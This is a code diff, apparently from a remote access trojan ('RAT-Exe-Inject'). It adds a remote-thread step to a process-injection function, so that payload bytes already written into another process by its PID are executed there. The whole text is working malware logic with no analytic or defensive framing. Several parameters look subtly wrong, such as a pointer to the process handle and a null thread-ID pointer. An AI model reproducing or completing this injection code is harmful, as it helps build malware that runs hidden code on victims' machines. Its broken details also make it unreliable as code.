@@ -34,8 +34,9 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	INT status = ERROR_SUCCESS;
 	CHAR messageBuffer [MAX_BUFFER_SIZE];
 	LPVOID baseAddress = NULL;
-	HANDLE hProcess;
+	HANDLE hProcess, hThread;
 	UINT64 numBytesWritten = 0;
+	LPDWORD threadID = { };
 
 
 	sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Injecting into process %d\n", PID);
@@ -63,8 +64,14 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 		goto cleanup;
 	}
 
+	hThread = CreateRemoteThreadEx(&hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, NULL, NULL, threadID);
+	if (hThread == NULL)
+	{
+		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to start remote thread!\n");
+		goto cleanup;
+	}
 
-
+	WaitForSingleObject(hThread, INFINITE);
 
 
 cleanup:
